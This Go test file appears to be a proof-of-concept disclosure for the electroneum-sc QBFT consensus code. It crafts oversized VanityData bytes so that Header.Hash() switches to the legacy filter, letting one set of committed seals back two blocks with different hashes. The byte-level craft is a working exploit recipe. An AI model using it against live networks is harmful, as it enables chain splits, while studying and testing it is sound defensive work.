package types

import (
	"bytes"
	"fmt"
	"testing"

	"github.com/electroneum/electroneum-sc/common"
	"github.com/electroneum/electroneum-sc/rlp"
)

func mkHeader(extra []byte) *Header {
	return &Header{
		ParentHash: common.HexToHash("0x01"),
		Number:     common.Big1,
		GasLimit:   30_000_000,
		Time:       1700000000,
		Difficulty: common.Big1,
		MixDigest:  IstanbulDigest, // makes Header.Hash() take the Istanbul path
		Extra:      extra,
	}
}

func qbftBytes(t *testing.T, vanity []byte, vals []common.Address, round uint32, cs [][]byte) []byte {
	t.Helper()
	b, err := rlp.EncodeToBytes(&QBFTExtra{
		VanityData: vanity, Validators: vals, Vote: nil, Round: round, CommittedSeal: cs,
	})
	if err != nil {
		t.Fatalf("encode: %v", err)
	}
	return b
}

func mkSeals(n int) [][]byte {
	out := make([][]byte, n)
	for i := range out {
		out[i] = bytes.Repeat([]byte{byte(0xA0 + i)}, IstanbulExtraSeal)
	}
	return out
}

// rlpHdrLen returns the length of the RLP header at b[0].
func rlpHdrLen(b []byte) int {
	switch c := b[0]; {
	case c < 0x80:
		return 0
	case c < 0xb8:
		return 1
	case c < 0xc0:
		return 1 + int(c-0xb7)
	case c < 0xf8:
		return 1
	default:
		return 1 + int(c-0xf7)
	}
}

// craftVanity builds a VanityData of length vlen that makes Extra[32:] parse as a
// legacy IstanbulExtra [Validators, Seal, CommittedSeal].
//
// Layout written at Extra offset 32:
//
//	f9 M1 M0   outer list, body length M, ending exactly at the end of Extra
//	c0         Validators = []
//	b9 N1 N0   Seal = one opaque byte string of length N
//
// N is sized so the Seal swallows the remaining vanity bytes and the REAL
// Validators / Vote / Round fields, leaving the REAL CommittedSeal ([][]byte) to
// be consumed as the fake struct's third field.
func craftVanity(t *testing.T, vlen int, vals []common.Address, round uint32, cs [][]byte) []byte {
	t.Helper()
	probe := qbftBytes(t, make([]byte, vlen), vals, round, cs)

	outerHdr := rlpHdrLen(probe)
	vanityStart := outerHdr + rlpHdrLen(probe[outerHdr:])
	off := 32 - vanityStart // index inside the vanity where Extra[32:] begins
	if off < 0 || off+7 > vlen {
		t.Fatalf("vlen %d unusable: off=%d", vlen, off)
	}

	csEnc, err := rlp.EncodeToBytes(cs)
	if err != nil {
		t.Fatalf("encode cs: %v", err)
	}
	csStart := len(probe) - len(csEnc)

	T := len(probe) - 32 // bytes available from Extra[32:]
	M := T - 3           // outer list body length (f9 M1 M0 is 3 bytes)
	N := csStart - 32 - 7

	if M < 256 || M > 0xffff {
		t.Fatalf("M=%d outside canonical f9 range", M)
	}
	if N < 256 || N > 0xffff {
		t.Fatalf("N=%d outside canonical b9 range", N)
	}
	// NOTE: a "1+3+N+len(csEnc) == M" assertion here would be a tautology -- both
	// sides are derived from len(probe) by construction, so it can never fire. The
	// real check that the craft is sound is the ExtractIstanbulExtra assertion in
	// the caller: if any of this arithmetic is wrong, the legacy decode fails and
	// the test stops there.

	vanity := make([]byte, vlen)
	copy(vanity[off:], []byte{
		0xf9, byte(M >> 8), byte(M),
		0xc0,
		0xb9, byte(N >> 8), byte(N),
	})
	return vanity
}

// TestVanityData_FlipsHashFilter proves that attacker-chosen VanityData decides
// which hashing rule Header.Hash() applies.
//
// core/types/istanbul.go:91-99 FilteredHeader picks the rule by TRYING the legacy
// decode first, and ExtractIstanbulExtra (istanbul.go:75-86) decodes h.Extra[32:] --
// the QBFT RLP with its first 32 bytes chopped off. A VanityData longer than 32
// bytes puts those bytes under attacker control.
//
// The legacy filter (IstanbulFilteredHeader, keepSeal=true) does NOT zero Round,
// and its framing depends on the committed-seal count. The QBFT filter
// (QBFTFilteredHeaderWithRound) zeroes both. So the craft makes the block hash a
// function of exactly the two fields QBFT must exclude from it.
func TestVanityData_FlipsHashFilter(t *testing.T) {
	vals := []common.Address{common.HexToAddress("0xaa"), common.HexToAddress("0xbb")}
	quorum := mkSeals(3)

	// Control: a normal 32-byte vanity must take the QBFT path.
	normal := qbftBytes(t, make([]byte, IstanbulExtraVanity), vals, 0, quorum)
	if _, err := ExtractIstanbulExtra(mkHeader(normal)); err == nil {
		t.Fatal("normal 32-byte vanity decoded as legacy IstanbulExtra")
	}
	fmt.Printf("\n=== VANITY-CONTROLLED HASH FILTER ===\n")
	fmt.Printf("  control: 32-byte vanity  -> legacy decode fails -> QBFT filter\n")

	const vlen = 400
	vanity := craftVanity(t, vlen, vals, 0, quorum)
	crafted := qbftBytes(t, vanity, vals, 0, quorum)

	if _, err := ExtractIstanbulExtra(mkHeader(crafted)); err != nil {
		t.Fatalf("craft failed, legacy decode still errors: %v", err)
	}
	fmt.Printf("  crafted: %d-byte vanity  -> legacy decode SUCCEEDS -> legacy filter\n\n", vlen)

	// The payoff. ONE crafted vanity, sized for the quorum seal count, then the
	// same header published with two different committed-seal counts -- which is
	// exactly what a Byzantine proposer can do, since any count in
	// [ceil(2N/3), N] is accepted by verifyCommittedSeals.
	hdrA := mkHeader(qbftBytes(t, vanity, vals, 0, quorum))     // craft matches -> legacy filter
	hdrB := mkHeader(qbftBytes(t, vanity, vals, 0, mkSeals(4))) // craft no longer matches -> QBFT filter
	hdrR := mkHeader(qbftBytes(t, vanity, vals, 1, quorum))     // same seals, round 1

	_, errA := ExtractIstanbulExtra(hdrA)
	_, errB := ExtractIstanbulExtra(hdrB)
	fmt.Printf("  variant A (3 seals, round 0): legacy decode err=%v -> %s filter\n", errA, filterName(errA))
	fmt.Printf("  variant B (4 seals, round 0): legacy decode err=%v -> %s filter\n", errB, filterName(errB))
	fmt.Printf("  variant R (3 seals, round 1): legacy decode err=%v -> %s filter\n\n", nil, filterName(nil))

	hA, hB, hR := hdrA.Hash(), hdrB.Hash(), hdrR.Hash()
	fmt.Printf("  Header.Hash() A : %x\n", hA[:12])
	fmt.Printf("  Header.Hash() B : %x\n", hB[:12])
	fmt.Printf("  Header.Hash() R : %x\n\n", hR[:12])

	// The QBFT rule -- what the committed seals actually sign -- is identical for
	// A and B, because it strips CommittedSeal and zeroes Round.
	qA := hdrA.QBFTHashWithRoundNumber(0)
	qB := hdrB.QBFTHashWithRoundNumber(0)
	fmt.Printf("  QBFTHashWithRoundNumber(0) A : %x\n", qA[:12])
	fmt.Printf("  QBFTHashWithRoundNumber(0) B : %x\n", qB[:12])

	if qA != qB {
		t.Fatalf("QBFT seal-hash differs between A and B (%x vs %x); the seals would not carry over", qA[:8], qB[:8])
	}
	fmt.Printf("  -> identical, so the SAME committed seals are valid for both variants\n\n")

	// Post-FutureFork 6-field encoding. QBFTExtra.EncodeRLP appends ProposerSeal as
	// a sixth field when it is non-empty, so the tail item of Extra becomes a BYTE
	// STRING. IstanbulExtra's third field is CommittedSeal [][]byte, which must be
	// an RLP list. That is a type conflict, not a length problem: no choice of the
	// fake Seal length rescues it. Both possible sizings are tried here.
	ps := bytes.Repeat([]byte{0x11}, IstanbulExtraSeal)
	sixField := func(v []byte) []byte {
		b, err := rlp.EncodeToBytes(&QBFTExtra{
			VanityData: v, Validators: vals, Vote: nil, Round: 0,
			CommittedSeal: quorum, ProposerSeal: ps,
		})
		if err != nil {
			t.Fatalf("encode 6-field: %v", err)
		}
		return b
	}
	csEnc, _ := rlp.EncodeToBytes(quorum)
	psEnc, _ := rlp.EncodeToBytes(ps)

	// craft6 places the fake legacy list at Extra[32:], ending at the end of Extra,
	// with the fake Seal sized so that field 3 begins at absolute offset field3At.
	craft6 := func(vlen, field3At int) []byte {
		probe := sixField(make([]byte, vlen))
		outerHdr := rlpHdrLen(probe)
		vanityStart := outerHdr + rlpHdrLen(probe[outerHdr:])
		off := 32 - vanityStart
		M := (len(probe) - 32) - 3
		N := field3At - 32 - 7
		if off < 0 || off+7 > vlen || M < 256 || M > 0xffff || N < 256 || N > 0xffff {
			t.Fatalf("6-field params unusable: off=%d M=%d N=%d", off, M, N)
		}
		v := make([]byte, vlen)
		copy(v[off:], []byte{0xf9, byte(M >> 8), byte(M), 0xc0, 0xb9, byte(N >> 8), byte(N)})
		return sixField(v)
	}

	probe6 := sixField(make([]byte, vlen))
	csStart6 := len(probe6) - len(csEnc) - len(psEnc)
	psStart6 := len(probe6) - len(psEnc)

	_, errCS := ExtractIstanbulExtra(mkHeader(craft6(vlen, csStart6)))
	_, errPS := ExtractIstanbulExtra(mkHeader(craft6(vlen, psStart6)))

	fmt.Printf("  post-FutureFork 6-field encoding (non-empty ProposerSeal):\n")
	fmt.Printf("    sizing 1, field 3 = real CommittedSeal  -> %v\n", errCS)
	fmt.Printf("    sizing 2, field 3 = ProposerSeal string -> %v\n", errPS)
	if errCS == nil || errPS == nil {
		t.Errorf("craft survives the 6-field form (errCS=%v errPS=%v)", errCS, errPS)
	} else {
		fmt.Printf("    both fail: the tail is a byte string, CommittedSeal must be a list.\n")
		fmt.Printf("    Structurally dead for ANY sizing, not just mis-sized.\n\n")
	}

	if hA == hB && hA == hR {
		fmt.Printf("  [MITIGATED] all variants hash identically -> no split\n\n")
		t.Skip("FilteredHeader no longer lets VanityData pick the filter")
	}

	// Red on unpatched code: that failure IS the finding.
	if hA != hB {
		t.Errorf("SPLIT: seal count changes Header.Hash() (%x vs %x) while the seal payload is identical", hA[:8], hB[:8])
	}
	if hA != hR {
		// Round is a rule violation on its own: QBFTFilteredHeaderWithRound zeroes
		// Round precisely so it cannot enter the block hash, and under the legacy
		// filter it does. But this does NOT yield a second seal-valid block --
		// Signers() derives the seal payload from extra.Round, so bumping the round
		// invalidates the committed seals. See TestVanitySplit_BothVariantsVerify,
		// which asserts variant R fails verifyCommittedSeals. Only the seal-count
		// vector produces two valid blocks.
		t.Errorf("RULE VIOLATION (not a second valid block): round changes Header.Hash() (%x vs %x)", hA[:8], hR[:8])
	}
}

func filterName(err error) string {
	if err == nil {
		return "LEGACY"
	}
	return "QBFT"
}
